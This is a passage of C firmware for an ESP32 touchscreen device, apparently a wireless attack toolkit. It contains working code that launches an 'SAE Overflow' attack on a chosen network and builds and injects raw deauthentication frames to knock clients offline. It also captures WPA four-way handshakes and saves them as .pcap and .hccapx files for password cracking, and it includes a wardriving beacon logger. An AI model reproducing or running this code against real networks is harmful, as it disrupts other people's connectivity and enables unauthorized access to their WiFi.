        } else {
            ESP_LOGE(TAG, "Failed to allocate sniffer task stack from PSRAM");
            sniffer_task_active = false;
        }
    }
}

static void sniffer_enough_btn_cb(lv_event_t *e)
{
    (void)e;
    
    // Stop sniffer task
    if (sniffer_task_active || sniffer_task_handle != NULL) {
        ESP_LOGI(TAG, "Stopping WiFi Sniffer...");
        sniffer_task_active = false;
        
        // Wait for task to finish gracefully (up to 7 seconds)
        for (int i = 0; i < 70 && sniffer_task_handle != NULL; i++) {
            vTaskDelay(pdMS_TO_TICKS(100));
        }
        
        // Only cleanup stack if task finished on its own
        if (sniffer_task_handle == NULL && sniffer_task_stack != NULL) {
            heap_caps_free(sniffer_task_stack);
            sniffer_task_stack = NULL;
        }
        
        ESP_LOGI(TAG, "Sniffer stopped");
    }
    sniffer_disable_log_capture();
    sniffer_log_ta = NULL;
    sniffer_stop_btn = NULL;
    sniffer_start_btn = NULL;
    sniffer_packets_label = NULL;
    sniffer_aps_label = NULL;
    sniffer_probes_label = NULL;
    sniffer_ui_active = false;  // Clear sniffer UI active flag
    scan_done_ui_flag = false;  // Clear any pending scan done flag
    // Navigate back to menu
    nav_to_menu_flag = true;
}

static void sae_overflow_yes_btn_cb(lv_event_t *e)
{
    (void)e;
    
    // Check if a network is selected
    const wifi_ap_record_t *records = wifi_scanner_get_results_ptr();
    
    // Get selected network count and index
    int selected_count = wifi_scanner_get_selected_count();
    int selected_indices[1];
    int selected_index = -1;
    
    if (selected_count > 0) {
        wifi_scanner_get_selected(selected_indices, 1);
        selected_index = selected_indices[0];
    }
    
    // SAE Overflow requires exactly ONE selected network
    if (selected_count != 1) {
        // Show error message with title bar intact
        create_function_page_base("SAE Overflow");
        
        lv_obj_t *error_label = lv_label_create(function_page);
        lv_label_set_text(error_label, "SAE Overflow requires\nexactly ONE network.\n\nPlease scan and select\none network.");
        lv_obj_set_style_text_align(error_label, LV_TEXT_ALIGN_CENTER, 0);
        lv_obj_set_style_text_color(error_label, COLOR_MATERIAL_RED, 0);
        lv_obj_set_style_text_font(error_label, &lv_font_montserrat_16, 0);
        lv_obj_align(error_label, LV_ALIGN_TOP_MID, 0, 40);
        
        // Back button
        lv_obj_t *back_btn = lv_btn_create(function_page);
        lv_obj_set_size(back_btn, 100, 35);
        lv_obj_align(back_btn, LV_ALIGN_BOTTOM_MID, 0, -10);
        lv_obj_set_style_bg_color(back_btn, COLOR_MATERIAL_TEAL, LV_STATE_DEFAULT);
        lv_obj_set_style_bg_color(back_btn, lv_color_lighten(COLOR_MATERIAL_TEAL, 30), LV_STATE_PRESSED);
        lv_obj_set_style_border_width(back_btn, 0, 0);
        lv_obj_set_style_radius(back_btn, 8, 0);
        lv_obj_t *back_lbl = lv_label_create(back_btn);
        lv_label_set_text(back_lbl, "BACK");
        lv_obj_set_style_text_color(back_lbl, ui_text_color(), 0);
        lv_obj_center(back_lbl);
        lv_obj_add_event_cb(back_btn, back_to_menu_cb, LV_EVENT_CLICKED, NULL);
        
        return;
    }
    
    // Recreate base page to keep title bar
    create_function_page_base("SAE Overflow");
    
    // Set SAE overflow UI active flag
    sae_overflow_ui_active = true;
    scan_done_ui_flag = false;
    
    // Get selected network info
    const wifi_ap_record_t *ap = &records[selected_index];
    char ssid[33];
    if (ap->ssid[0]) {
        snprintf(ssid, sizeof(ssid), "%s", (const char *)ap->ssid);
    } else {
        snprintf(ssid, sizeof(ssid), "%02X%02X%02X%02X%02X%02X",
                 ap->bssid[0], ap->bssid[1], ap->bssid[2],
                 ap->bssid[3], ap->bssid[4], ap->bssid[5]);
    }
    
    // Attacked network info
    lv_obj_t *network_info = lv_label_create(function_page);
    char info_text[160];
    const char *band = (ap->primary <= 14) ? "2.4GHz" : "5GHz";
    snprintf(info_text, sizeof(info_text), 
             "Attacked network:\n\n"
             "SSID: %s\n"
             "Channel: %d (%s)\n"
             "BSSID: %02X:%02X:%02X:%02X:%02X:%02X",
             ssid, ap->primary, band,
             ap->bssid[0], ap->bssid[1], ap->bssid[2],
             ap->bssid[3], ap->bssid[4], ap->bssid[5]);
    lv_label_set_text(network_info, info_text);
    lv_obj_set_style_text_color(network_info, ui_text_color(), 0);
    lv_obj_set_style_text_font(network_info, &lv_font_montserrat_14, 0);
    lv_obj_align(network_info, LV_ALIGN_TOP_MID, 0, 40);
    lv_obj_set_style_text_align(network_info, LV_TEXT_ALIGN_CENTER, 0);
    
    // Stop & Exit tile at bottom (red with X icon) - same as Deauth
    sae_overflow_stop_btn = lv_btn_create(function_page);
    lv_obj_set_size(sae_overflow_stop_btn, 120, 55);
    lv_obj_align(sae_overflow_stop_btn, LV_ALIGN_BOTTOM_MID, 0, -10);
    lv_obj_set_style_bg_color(sae_overflow_stop_btn, COLOR_MATERIAL_RED, LV_STATE_DEFAULT);
    lv_obj_set_style_bg_color(sae_overflow_stop_btn, lv_color_lighten(COLOR_MATERIAL_RED, 50), LV_STATE_PRESSED);
    lv_obj_set_style_border_width(sae_overflow_stop_btn, 0, 0);
    lv_obj_set_style_radius(sae_overflow_stop_btn, 10, 0);
    lv_obj_set_style_shadow_width(sae_overflow_stop_btn, 6, 0);
    lv_obj_set_style_shadow_color(sae_overflow_stop_btn, lv_color_make(0, 0, 0), 0);
    lv_obj_set_style_shadow_opa(sae_overflow_stop_btn, LV_OPA_40, 0);
    lv_obj_set_flex_flow(sae_overflow_stop_btn, LV_FLEX_FLOW_COLUMN);
    lv_obj_set_flex_align(sae_overflow_stop_btn, LV_FLEX_ALIGN_CENTER, LV_FLEX_ALIGN_CENTER, LV_FLEX_ALIGN_CENTER);
    
    lv_obj_t *x_icon = lv_label_create(sae_overflow_stop_btn);
    lv_label_set_text(x_icon, LV_SYMBOL_CLOSE);
    lv_obj_set_style_text_font(x_icon, &lv_font_montserrat_20, 0);
    lv_obj_set_style_text_color(x_icon, ui_text_color(), 0);
    
    lv_obj_t *stop_text = lv_label_create(sae_overflow_stop_btn);
    lv_label_set_text(stop_text, "Stop & Exit");
    lv_obj_set_style_text_font(stop_text, &lv_font_montserrat_12, 0);
    lv_obj_set_style_text_color(stop_text, ui_text_color(), 0);
    
    lv_obj_add_event_cb(sae_overflow_stop_btn, sae_overflow_stop_btn_cb, LV_EVENT_CLICKED, NULL);
    
    // Save selected network as target
    wifi_scanner_save_target_bssids();
    
    // Start SAE overflow attack
    esp_err_t start_res = wifi_attacks_start_sae_overflow();
    if (start_res != ESP_OK) {
        // Show error on the network info label
        char err[128];
        snprintf(err, sizeof(err), 
                 "Attacked network:\n\n"
                 "SSID: %s\n\n"
                 "Start failed: %s",
                 ssid, esp_err_to_name(start_res));
        lv_label_set_text(network_info, err);
        lv_obj_set_style_text_color(network_info, COLOR_MATERIAL_RED, 0);
        return;
    }
    
    sae_overflow_log_ta = NULL;  // No longer using textarea
    
    show_touch_dot = false;
    if (touch_dot) {
        lv_obj_add_flag(touch_dot, LV_OBJ_FLAG_HIDDEN);
    }
}

static void sae_overflow_stop_btn_cb(lv_event_t *e)
{
    (void)e;
    // Stop SAE overflow attack
    wifi_attacks_stop_all();
    sae_overflow_disable_log_capture();
    sae_overflow_log_ta = NULL;
    sae_overflow_stop_btn = NULL;
    sae_overflow_ui_active = false;
    scan_done_ui_flag = false;
    // Navigate back to menu
    nav_to_menu_flag = true;
}

static bool check_handshake_file_exists(const char *ssid) {
    if (!ssid || strlen(ssid) == 0) return false;
    if (sd_cache == NULL || !sd_cache->loaded) return false;

    size_t ssid_len = strlen(ssid);
    for (int i = 0; i < sd_cache->handshake_count; i++) {
        const char *name = sd_cache->handshake_names[i];
        if (name && strncmp(name, ssid, ssid_len) == 0 && strstr(name, ".pcap") != NULL) {
            return true;
        }
    }
    return false;
}

static bool check_handshake_file_exists_by_bssid(const uint8_t *bssid) {
    if (!bssid) return false;
    if (sd_cache == NULL || !sd_cache->loaded) return false;

    char mac_suffix[7];
    snprintf(mac_suffix, sizeof(mac_suffix), "%02X%02X%02X", bssid[3], bssid[4], bssid[5]);

    for (int i = 0; i < sd_cache->handshake_count; i++) {
        const char *name = sd_cache->handshake_names[i];
        if (name && strstr(name, mac_suffix) != NULL && strstr(name, ".pcap") != NULL) {
            return true;
        }
    }
    return false;
}

// ============================================================================
// D-UCB (Discounted Upper Confidence Bound) Algorithm for Channel Selection
// ============================================================================

static void ducb_init(void) {
    ducb_channel_count = dual_band_channels_count;
    ducb_discounted_total = 0.0;
    for (int i = 0; i < ducb_channel_count; i++) {
        ducb_channels[i].channel = dual_band_channels[i];
        ducb_channels[i].discounted_reward = 0.0;
        ducb_channels[i].discounted_pulls = 0.0;
        ducb_channels[i].total_pulls = 0;
    }
}

static void ducb_apply_discount(void) {
    ducb_discounted_total *= DUCB_GAMMA;
    for (int i = 0; i < ducb_channel_count; i++) {
        ducb_channels[i].discounted_reward *= DUCB_GAMMA;
        ducb_channels[i].discounted_pulls *= DUCB_GAMMA;
    }
}

static int ducb_select_channel(void) {
    ducb_apply_discount();
    int best_idx = 0;
    double best_ucb = -1.0;
    for (int i = 0; i < ducb_channel_count; i++) {
        if (ducb_channels[i].discounted_pulls < 0.001) {
            best_idx = i;
            best_ucb = 1e18;
            break;
        }
        double avg_reward = ducb_channels[i].discounted_reward / ducb_channels[i].discounted_pulls;
        double exploration = DUCB_C * sqrt(log(ducb_discounted_total + 1.0) / ducb_channels[i].discounted_pulls);
        double ucb = avg_reward + exploration;
        if (ucb > best_ucb) {
            best_ucb = ucb;
            best_idx = i;
        }
    }
    return best_idx;
}

static void ducb_update(int channel_idx, double reward) {
    ducb_channels[channel_idx].discounted_pulls += 1.0;
    ducb_channels[channel_idx].discounted_reward += reward;
    ducb_channels[channel_idx].total_pulls++;
    ducb_discounted_total += 1.0;
}

// ============================================================================
// Wardrive Promisc: D-UCB, Dedup, Promiscuous Callback
// ============================================================================

static void wdp_ducb_init(void) {
    wdp_ducb_channel_count = 0;
    wdp_ducb_discounted_total = 0.0;
    for (int i = 0; i < (int)WDP_CH_24_PRIMARY_COUNT; i++) {
        wdp_ducb_channels[wdp_ducb_channel_count].channel = wdp_ch_24_primary[i];
        wdp_ducb_channels[wdp_ducb_channel_count].tier = WDP_TIER_24_PRIMARY;
        wdp_ducb_channels[wdp_ducb_channel_count].discounted_reward = 0.5;
        wdp_ducb_channels[wdp_ducb_channel_count].discounted_pulls = 0.0;
        wdp_ducb_channels[wdp_ducb_channel_count].total_pulls = 0;
        wdp_ducb_channel_count++;
    }
    for (int i = 0; i < (int)WDP_CH_24_SECONDARY_COUNT; i++) {
        wdp_ducb_channels[wdp_ducb_channel_count].channel = wdp_ch_24_secondary[i];
        wdp_ducb_channels[wdp_ducb_channel_count].tier = WDP_TIER_24_SECONDARY;
        wdp_ducb_channels[wdp_ducb_channel_count].discounted_reward = 0.0;
        wdp_ducb_channels[wdp_ducb_channel_count].discounted_pulls = 0.0;
        wdp_ducb_channels[wdp_ducb_channel_count].total_pulls = 0;
        wdp_ducb_channel_count++;
    }
    for (int i = 0; i < (int)WDP_CH_5_NON_DFS_COUNT; i++) {
        wdp_ducb_channels[wdp_ducb_channel_count].channel = wdp_ch_5_non_dfs[i];
        wdp_ducb_channels[wdp_ducb_channel_count].tier = WDP_TIER_5_NON_DFS;
        wdp_ducb_channels[wdp_ducb_channel_count].discounted_reward = 0.0;
        wdp_ducb_channels[wdp_ducb_channel_count].discounted_pulls = 0.0;
        wdp_ducb_channels[wdp_ducb_channel_count].total_pulls = 0;
        wdp_ducb_channel_count++;
    }
    for (int i = 0; i < (int)WDP_CH_5_DFS_COUNT; i++) {
        wdp_ducb_channels[wdp_ducb_channel_count].channel = wdp_ch_5_dfs[i];
        wdp_ducb_channels[wdp_ducb_channel_count].tier = WDP_TIER_5_DFS;
        wdp_ducb_channels[wdp_ducb_channel_count].discounted_reward = 0.0;
        wdp_ducb_channels[wdp_ducb_channel_count].discounted_pulls = 0.0;
        wdp_ducb_channels[wdp_ducb_channel_count].total_pulls = 0;
        wdp_ducb_channel_count++;
    }
}

static int wdp_ducb_select_channel(void) {
    wdp_ducb_discounted_total *= WDP_DUCB_GAMMA;
    for (int i = 0; i < wdp_ducb_channel_count; i++) {
        wdp_ducb_channels[i].discounted_reward *= WDP_DUCB_GAMMA;
        wdp_ducb_channels[i].discounted_pulls *= WDP_DUCB_GAMMA;
    }
    int best_idx = 0;
    double best_ucb = -1.0;
    for (int i = 0; i < wdp_ducb_channel_count; i++) {
        if (wdp_ducb_channels[i].discounted_pulls < 0.001) {
            best_idx = i;
            break;
        }
        double avg_reward = wdp_ducb_channels[i].discounted_reward / wdp_ducb_channels[i].discounted_pulls;
        double exploration = WDP_DUCB_C * sqrt(log(wdp_ducb_discounted_total + 1.0) / wdp_ducb_channels[i].discounted_pulls);
        double ucb = avg_reward + exploration;
        if (ucb > best_ucb) {
            best_ucb = ucb;
            best_idx = i;
        }
    }
    return best_idx;
}

static void wdp_ducb_update(int channel_idx, double reward) {
    wdp_ducb_channels[channel_idx].discounted_pulls += 1.0;
    wdp_ducb_channels[channel_idx].discounted_reward += reward;
    wdp_ducb_channels[channel_idx].total_pulls++;
    wdp_ducb_discounted_total += 1.0;
}

static int wdp_get_dwell_ms(wdp_channel_tier_t tier) {
    switch (tier) {
        case WDP_TIER_24_PRIMARY:   return WDP_DWELL_PRIMARY_MS;
        case WDP_TIER_24_SECONDARY: return WDP_DWELL_DEFAULT_MS;
        case WDP_TIER_5_NON_DFS:    return WDP_DWELL_DEFAULT_MS;
        case WDP_TIER_5_DFS:        return WDP_DWELL_DFS_MS;
        default:                    return WDP_DWELL_DEFAULT_MS;
    }
}

// ============================================================================
// Sniffer Handshake: AP and Client Management
// ============================================================================

static int hs_find_ap(const uint8_t *bssid) {
    for (int i = 0; i < hs_ap_count; i++) {
        if (memcmp(hs_ap_targets[i].bssid, bssid, 6) == 0) return i;
    }
    return -1;
}

static int hs_add_or_update_ap(const uint8_t *bssid, const char *ssid, uint8_t channel,
                                wifi_auth_mode_t authmode, int rssi) {
    int idx = hs_find_ap(bssid);
    if (idx >= 0) {
        if (ssid && ssid[0]) strncpy(hs_ap_targets[idx].ssid, ssid, 32);
        hs_ap_targets[idx].channel = channel;
        hs_ap_targets[idx].rssi = rssi;
        hs_ap_targets[idx].last_seen_us = esp_timer_get_time();
        if (authmode != WIFI_AUTH_OPEN) hs_ap_targets[idx].authmode = authmode;
        return idx;
    }
    if (hs_ap_count >= HS_MAX_APS) return -1;
    idx = hs_ap_count++;
    memcpy(hs_ap_targets[idx].bssid, bssid, 6);
    if (ssid) strncpy(hs_ap_targets[idx].ssid, ssid, 32);
    hs_ap_targets[idx].ssid[32] = '\0';
    hs_ap_targets[idx].channel = channel;
    hs_ap_targets[idx].authmode = authmode;
    hs_ap_targets[idx].rssi = rssi;
    hs_ap_targets[idx].captured_m1 = false;
    hs_ap_targets[idx].captured_m2 = false;
    hs_ap_targets[idx].captured_m3 = false;
    hs_ap_targets[idx].captured_m4 = false;
    hs_ap_targets[idx].complete = false;
    hs_ap_targets[idx].beacon_captured = false;
    hs_ap_targets[idx].last_deauth_us = 0;
    hs_ap_targets[idx].last_seen_us = esp_timer_get_time();
    hs_ap_targets[idx].target_index = -1;
    hs_ap_targets[idx].has_existing_file =
        check_handshake_file_exists(ssid ? ssid : "") ||
        check_handshake_file_exists_by_bssid(bssid);
    if (hs_ap_targets[idx].has_existing_file) {
        ESP_LOGI(TAG, "[HS] Skipping '%s' - PCAP already exists", hs_ap_targets[idx].ssid);
    }
    return idx;
}

static int hs_find_client(const uint8_t *mac) {
    for (int i = 0; i < hs_client_count; i++) {
        if (memcmp(hs_clients[i].mac, mac, 6) == 0) return i;
    }
    return -1;
}

static int hs_add_or_update_client(const uint8_t *client_mac, int ap_index, int rssi) {
    int64_t now = esp_timer_get_time();
    int idx = hs_find_client(client_mac);
    if (idx >= 0) {
        if (ap_index >= 0) hs_clients[idx].hs_ap_index = ap_index;
        hs_clients[idx].rssi = rssi;
        hs_clients[idx].last_seen_us = now;
        return idx;
    }
    if (hs_client_count >= HS_MAX_CLIENTS) return -1;
    idx = hs_client_count++;
    memcpy(hs_clients[idx].mac, client_mac, 6);
    hs_clients[idx].hs_ap_index = ap_index;
    hs_clients[idx].rssi = rssi;
    hs_clients[idx].last_seen_us = now;
    hs_clients[idx].last_deauth_us = 0;
    hs_clients[idx].deauthed = false;
    hs_dwell_new_clients++;
    return idx;
}

// ============================================================================
// Sniffer Handshake: EAPOL Message Detection
// ============================================================================

static uint8_t hs_get_eapol_msg_num(eapol_key_packet_t *eapol_key) {
    if (!eapol_key) return 0;
    uint16_t key_info_raw = *((uint16_t*)&eapol_key->key_information);
    uint8_t byte0 = (key_info_raw >> 8) & 0xFF;
    uint8_t byte1 = key_info_raw & 0xFF;
    bool key_ack = (byte0 & 0x80) != 0;
    bool install = (byte0 & 0x40) != 0;
    bool key_mic = (byte1 & 0x01) != 0;
    if (key_ack && !install && !key_mic) return 1;
    if (key_ack && install && key_mic) return 3;
    if (!key_ack && key_mic && !install) {
        bool has_nonce = false;
        for (int i = 0; i < 16; i++) {
            if (eapol_key->key_nonce[i] != 0) { has_nonce = true; break; }
        }
        return has_nonce ? 2 : 4;
    }
    return 0;
}

// ============================================================================
// Sniffer Handshake: Targeted Deauth
// ============================================================================

static void hs_send_raw_frame(const uint8_t *frame, size_t len) {
    esp_err_t err = esp_wifi_80211_tx(WIFI_IF_AP, frame, len, false);
    if (err == ESP_ERR_INVALID_ARG) {
        esp_wifi_80211_tx(WIFI_IF_STA, frame, len, false);
    }
}

static void hs_send_targeted_deauth(const uint8_t *station_mac, const uint8_t *ap_bssid, uint8_t channel) {
    uint8_t current_channel;
    wifi_second_chan_t second_chan;
    esp_wifi_get_channel(&current_channel, &second_chan);
    if (current_channel != channel) {
        vTaskDelay(pdMS_TO_TICKS(20));
        esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);
        vTaskDelay(pdMS_TO_TICKS(20));
    }
    uint8_t deauth_frame[] = {
        0xC0, 0x00,
        0x00, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x00,
        0x01, 0x00
    };

    // Broadcast deauth (like the working Deauther does)
    static const uint8_t broadcast_mac[] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
    memcpy(&deauth_frame[4], broadcast_mac, 6);
    memcpy(&deauth_frame[10], ap_bssid, 6);
    memcpy(&deauth_frame[16], ap_bssid, 6);
    for (int i = 0; i < 5; i++) {
        hs_send_raw_frame(deauth_frame, sizeof(deauth_frame));
        vTaskDelay(pdMS_TO_TICKS(10));
    }

    // Targeted deauth: AP -> client
    memcpy(&deauth_frame[4], station_mac, 6);
    memcpy(&deauth_frame[10], ap_bssid, 6);
    memcpy(&deauth_frame[16], ap_bssid, 6);
    for (int i = 0; i < 5; i++) {
        hs_send_raw_frame(deauth_frame, sizeof(deauth_frame));
        vTaskDelay(pdMS_TO_TICKS(10));
    }

    // Targeted deauth: client -> AP (bidirectional)
    memcpy(&deauth_frame[4], ap_bssid, 6);
    memcpy(&deauth_frame[10], station_mac, 6);
    memcpy(&deauth_frame[16], ap_bssid, 6);
    for (int i = 0; i < 3; i++) {
        hs_send_raw_frame(deauth_frame, sizeof(deauth_frame));
        vTaskDelay(pdMS_TO_TICKS(10));
    }
}

// ============================================================================
// Sniffer Handshake: Per-AP PCAP Save
// ============================================================================

static void hs_sanitize_ssid(char *out, const char *in, size_t out_size) {
    size_t j = 0;
    for (size_t i = 0; in[i] && j < out_size - 1; i++) {
        char c = in[i];
        if ((c >= 'a' && c <= 'z') || (c >= 'A' && c <= 'Z') ||
            (c >= '0' && c <= '9') || c == '-' || c == '_' || c == '.') {
            out[j++] = c;
        } else {
            out[j++] = '_';
        }
    }
    out[j] = '\0';
    if (j == 0) {
        strncpy(out, "hidden", out_size - 1);
        out[out_size - 1] = '\0';
    }
}

static bool hs_save_handshake_to_sd(int ap_idx) {
    hs_ap_target_t *ap = &hs_ap_targets[ap_idx];
    hccapx_t *hccapx = (hccapx_t *)hccapx_serializer_get();
    unsigned pcap_size = pcap_serializer_get_size();
    uint8_t *pcap_buf = pcap_serializer_get_buffer();

    if (!pcap_buf || pcap_size == 0) {
        ESP_LOGI(TAG, "[HS-SAVE] No PCAP data for '%s'", ap->ssid);
        return false;
    }

    if (sd_spi_mutex) xSemaphoreTake(sd_spi_mutex, portMAX_DELAY);

    struct stat st = {0};
    if (stat("/sdcard/lab/handshakes", &st) == -1) {
        mkdir("/sdcard/lab", 0777);
        mkdir("/sdcard/lab/handshakes", 0700);
    }

    char ssid_safe[33];
    char mac_suffix[7];
    hs_sanitize_ssid(ssid_safe, ap->ssid, sizeof(ssid_safe));
    snprintf(mac_suffix, sizeof(mac_suffix), "%02X%02X%02X",
             ap->bssid[3], ap->bssid[4], ap->bssid[5]);

    uint64_t timestamp = esp_timer_get_time() / 1000;
    char filename[128];

    snprintf(filename, sizeof(filename), "/sdcard/lab/handshakes/%s_%s_%llu.pcap",
             ssid_safe, mac_suffix, (unsigned long long)timestamp);

    FILE *f = fopen(filename, "wb");
    if (!f) {
        ESP_LOGI(TAG, "[HS-SAVE] Failed to open: %s", filename);
        if (sd_spi_mutex) xSemaphoreGive(sd_spi_mutex);
        return false;
    }
    size_t written = fwrite(pcap_buf, 1, pcap_size, f);
    fclose(f);

    if (written != pcap_size) {
        ESP_LOGI(TAG, "[HS-SAVE] Incomplete write: %zu/%u", written, pcap_size);
        if (sd_spi_mutex) xSemaphoreGive(sd_spi_mutex);
        return false;
    }
    ESP_LOGI(TAG, "[HS-SAVE] PCAP saved: %s (%u bytes)", filename, pcap_size);

    // Keep PSRAM cache in sync with newly saved .pcap
    char pcap_basename[96];
    snprintf(pcap_basename, sizeof(pcap_basename), "%s_%s_%llu.pcap",
             ssid_safe, mac_suffix, (unsigned long long)timestamp);
    sd_cache_add_handshake_name(pcap_basename);

    if (hccapx) {
        snprintf(filename, sizeof(filename), "/sdcard/lab/handshakes/%s_%s_%llu.hccapx",
                 ssid_safe, mac_suffix, (unsigned long long)timestamp);
        f = fopen(filename, "wb");
        if (f) {
            fwrite(hccapx, 1, sizeof(hccapx_t), f);
            fclose(f);
            ESP_LOGI(TAG, "[HS-SAVE] HCCAPX saved: %s", filename);
        }
    }

    int fd = open("/sdcard/.sync", O_WRONLY | O_CREAT | O_TRUNC, 0644);
    if (fd >= 0) { fsync(fd); close(fd); unlink("/sdcard/.sync"); }

    if (sd_spi_mutex) xSemaphoreGive(sd_spi_mutex);

    ESP_LOGI(TAG, "Complete 4-way handshake saved for SSID: %s (MAC: %s)", ssid_safe, mac_suffix);
    return true;
}

// ============================================================================
// Sniffer Handshake: Promiscuous Callback
// ============================================================================

static void hs_sniffer_promiscuous_cb(void *buf, wifi_promiscuous_pkt_type_t type) {
    if (!handshake_attack_active) return;
    if (type != WIFI_PKT_DATA && type != WIFI_PKT_MGMT) return;

    const wifi_promiscuous_pkt_t *pkt = (wifi_promiscuous_pkt_t *)buf;
    const uint8_t *frame = pkt->payload;
    int len = pkt->rx_ctrl.sig_len;
    if (len < 24) return;

    uint8_t frame_type = frame[0] & 0xFC;
    uint8_t to_ds = (frame[1] & 0x01) != 0;
    uint8_t from_ds = (frame[1] & 0x02) != 0;
    uint8_t *addr1 = (uint8_t *)&frame[4];
    uint8_t *addr2 = (uint8_t *)&frame[10];
    uint8_t *addr3 = (uint8_t *)&frame[16];

    if (type == WIFI_PKT_MGMT) {
        if (frame_type == 0x80) {
            uint8_t *ap_bssid = addr2;
            const uint8_t *body = frame + 24 + 12;
            int body_len = len - 24 - 12;
            char ssid[33] = {0};
            uint8_t beacon_channel = pkt->rx_ctrl.channel;
            wifi_auth_mode_t authmode = WIFI_AUTH_OPEN;
            int offset = 0;
            while (offset + 2 <= body_len) {
                uint8_t tag = body[offset];
                uint8_t tag_len = body[offset + 1];
                if (offset + 2 + tag_len > body_len) break;
                if (tag == 0 && tag_len > 0 && tag_len <= 32) {
                    memcpy(ssid, &body[offset + 2], tag_len);
                    ssid[tag_len] = '\0';
                } else if (tag == 3 && tag_len == 1) {
                    beacon_channel = body[offset + 2];
                } else if (tag == 48) {
                    authmode = WIFI_AUTH_WPA2_PSK;
                } else if (tag == 221) {
                    if (tag_len >= 4 && body[offset+2] == 0x00 && body[offset+3] == 0x50 &&
                        body[offset+4] == 0xF2 && body[offset+5] == 0x01) {
                        if (authmode == WIFI_AUTH_OPEN) authmode = WIFI_AUTH_WPA_PSK;
                    }
                }
                offset += 2 + tag_len;
            }
            if (authmode != WIFI_AUTH_OPEN) {
                int ap_idx = hs_add_or_update_ap(ap_bssid, ssid, beacon_channel, authmode, pkt->rx_ctrl.rssi);
                if (ap_idx >= 0 && !hs_ap_targets[ap_idx].beacon_captured &&
                    !hs_ap_targets[ap_idx].has_existing_file && !hs_ap_targets[ap_idx].complete) {
                    pcap_serializer_append_frame(frame, len, pkt->rx_ctrl.timestamp);
                    hs_ap_targets[ap_idx].beacon_captured = true;
                }
            }
            return;
        }
        if (frame_type == 0x00 || frame_type == 0xB0) {
            uint8_t *client_mac = addr2;
            uint8_t *ap_mac = addr1;
            if (client_mac[0] & 0x01) return;
            int ap_idx = hs_find_ap(ap_mac);
            if (ap_idx >= 0 && !hs_ap_targets[ap_idx].has_existing_file && !hs_ap_targets[ap_idx].complete) {
                hs_add_or_update_client(client_mac, ap_idx, pkt->rx_ctrl.rssi);
            }
        }
        return;
    }

    if (type == WIFI_PKT_DATA) {
        uint8_t *client_mac = NULL;
        uint8_t *ap_mac = NULL;
        if (to_ds && !from_ds) {
            ap_mac = addr1; client_mac = addr2;
        } else if (!to_ds && from_ds) {
            ap_mac = addr2; client_mac = addr1;
        } else if (!to_ds && !from_ds) {
            ap_mac = addr3; client_mac = addr2;
        } else {
            return;
        }
        if (client_mac[0] & 0x01) return;
        int ap_idx = hs_find_ap(ap_mac);
        if (ap_idx < 0) return;
        hs_ap_target_t *ap = &hs_ap_targets[ap_idx];
        if (ap->has_existing_file || ap->complete) return;
        hs_add_or_update_client(client_mac, ap_idx, pkt->rx_ctrl.rssi);

        data_frame_t *data_frame = (data_frame_t *)frame;
        eapol_packet_t *eapol = parse_eapol_packet(data_frame);
        if (!eapol) return;
        eapol_key_packet_t *eapol_key = parse_eapol_key_packet(eapol);
        if (!eapol_key) return;
        uint8_t msg_num = hs_get_eapol_msg_num(eapol_key);
        if (msg_num == 0) return;

        hs_dwell_eapol_frames++;
        bool is_new = false;
        switch (msg_num) {
            case 1: if (!ap->captured_m1) { ap->captured_m1 = true; is_new = true; } break;
            case 2: if (!ap->captured_m2) { ap->captured_m2 = true; is_new = true; } break;
            case 3: if (!ap->captured_m3) { ap->captured_m3 = true; is_new = true; } break;
            case 4: if (!ap->captured_m4) { ap->captured_m4 = true; is_new = true; } break;
        }
        if (is_new) {
            ESP_LOGI(TAG, "[HS-SNIFF] EAPOL M%d captured for '%s'", msg_num, ap->ssid);
            hs_ui_update_flag = true;
        }

        pcap_serializer_append_frame(frame, len, pkt->rx_ctrl.timestamp);
        hccapx_serializer_add_frame(data_frame);

        if (ap->captured_m1 && ap->captured_m2 && ap->captured_m3 && ap->captured_m4) {
            ap->complete = true;
            hs_ui_update_flag = true;
            ESP_LOGI(TAG, "Handshake captured for '%s' - all 4 EAPOL messages!", ap->ssid);
        }
    }
}

// ============================================================================
// Wardrive Promisc: Promiscuous Callback and Buffer Growth
// ============================================================================

static int wdp_find_bssid(const uint8_t *bssid) {
    for (int i = 0; i < wdp_seen_count; i++) {
        if (memcmp(wdp_seen_networks[i].bssid, bssid, 6) == 0) return i;
    }
    return -1;
}

static void wdp_promiscuous_cb(void *buf, wifi_promiscuous_pkt_type_t type) {
    if (!wardrive_active) return;
    if (type != WIFI_PKT_MGMT) return;

    const wifi_promiscuous_pkt_t *pkt = (wifi_promiscuous_pkt_t *)buf;
    const uint8_t *frame = pkt->payload;
    int len = pkt->rx_ctrl.sig_len;
    if (len < 36) return;

    uint8_t frame_type = frame[0] & 0xFC;
    if (frame_type != 0x80) return;

    const uint8_t *ap_bssid = &frame[10];
    const uint8_t *body = frame + 24 + 12;
    int body_len = len - 24 - 12;
    if (body_len < 2) return;

    char ssid[33] = {0};
    uint8_t beacon_channel = pkt->rx_ctrl.channel;
    wifi_auth_mode_t authmode = WIFI_AUTH_OPEN;
    int offset = 0;
    while (offset + 2 <= body_len) {
        uint8_t tag = body[offset];
        uint8_t tag_len = body[offset + 1];
        if (offset + 2 + tag_len > body_len) break;
        if (tag == 0 && tag_len > 0 && tag_len <= 32) {
            memcpy(ssid, &body[offset + 2], tag_len);
            ssid[tag_len] = '\0';
        } else if (tag == 3 && tag_len == 1) {
            beacon_channel = body[offset + 2];
        } else if (tag == 48) {
            authmode = WIFI_AUTH_WPA2_PSK;
        } else if (tag == 221) {
            if (tag_len >= 4 && body[offset+2] == 0x00 && body[offset+3] == 0x50 &&
                body[offset+4] == 0xF2 && body[offset+5] == 0x01) {
                if (authmode == WIFI_AUTH_OPEN) authmode = WIFI_AUTH_WPA_PSK;
            }
        }
        offset += 2 + tag_len;
    }

    int existing = wdp_find_bssid(ap_bssid);
    if (existing >= 0) {
        if (pkt->rx_ctrl.rssi > wdp_seen_networks[existing].rssi) {
            wdp_seen_networks[existing].rssi = (int8_t)pkt->rx_ctrl.rssi;
        }
        return;
    }

    if (wdp_seen_count >= wdp_seen_capacity) {
        wdp_needs_grow = true;
        return;
    }

    int idx = wdp_seen_count;
    memcpy(wdp_seen_networks[idx].bssid, ap_bssid, 6);
    strncpy(wdp_seen_networks[idx].ssid, ssid, 32);
